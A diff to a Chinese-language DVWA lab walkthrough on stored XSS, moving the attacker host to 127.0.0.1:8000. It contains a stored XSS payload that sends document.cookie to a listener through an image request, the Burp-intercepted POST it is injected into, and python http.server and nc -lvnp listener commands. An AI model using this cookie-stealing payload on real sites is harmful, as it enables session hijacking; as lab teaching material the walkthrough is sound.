@@ -124,14 +124,14 @@ Name 字段同样存在注入。提交：
 2. Burp 拦截到 POST 请求：
    ```http
     POST /dvwa/vulnerabilities/xss_s/ HTTP/1.1
-    Host: 靶机IP
+    Host: 127.0.0.1
     Cookie: PHPSESSID=...; security=low
    
     txtName=test&mtxMessage=hello&btnSign=Sign+Guestbook
    ```
 3. 将 `mtxMessage` 修改为完整 Payload：
    ```text
-    mtxMessage=<script>new Image().src='http://192.168.1.10/steal?c='+document.cookie;</script>
+    mtxMessage=<script>new Image().src='http://127.0.0.1:8000/steal?c='+document.cookie;</script>
    ```
 4. 转发请求，Payload 成功写入数据库。
 
@@ -188,13 +188,13 @@ BeEF 会对被控浏览器执行多种模块，例如：获取 Cookie、截屏�
 在攻击机执行：
 
 ```bash
-python3 -m http.server 80
+python3 -m http.server 8000
 ```
 
 或者用更灵活的 `nc`：
 
 ```bash
-nc -lvnp 80
+nc -lvnp 8000
 ```
 
 ### 2. 注入 Payload
